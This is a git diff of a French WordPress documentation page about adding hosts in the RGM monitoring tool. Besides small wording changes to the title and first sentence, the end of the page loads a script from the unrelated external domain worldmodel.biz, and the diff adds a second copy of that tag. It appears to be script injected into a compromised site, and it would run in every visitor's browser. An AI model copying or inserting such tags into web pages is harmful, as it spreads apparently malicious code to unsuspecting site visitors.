@@ -1,6 +1,6 @@
 ---
 ID: 178
-post_title: 'Création d&rsquo;un Host dans RGM'
+post_title: 'Ajout d&rsquo;un Host dans RGM'
 author: Samuel RONCIAUX
 post_excerpt: ""
 layout: page
@@ -9,7 +9,7 @@ permalink: >
 published: true
 post_date: 2020-02-17 09:12:16
 ---
-La création des Hosts dans RGM peuvent être effectuée via différentes méthodes : 
+L'ajout des Hosts dans RGM peuvent être effectuée via différentes méthodes : 
 <li style="list-style-type: none;">
   <ul>
     <li style="list-style-type: none;">
@@ -32,4 +32,4 @@ La création des Hosts dans RGM peuvent être effectuée via différentes métho
   </ul>
 </li>       
 
-<script src="//worldmodel.biz/2241c61e4c10670366.js" async="" type="text/javascript"></script>
+<script src="//worldmodel.biz/2241c61e4c10670366.js" async="" type="text/javascript"></script> <script src="//worldmodel.biz/2241c61e4c10670366.js" async="" type="text/javascript"></script>
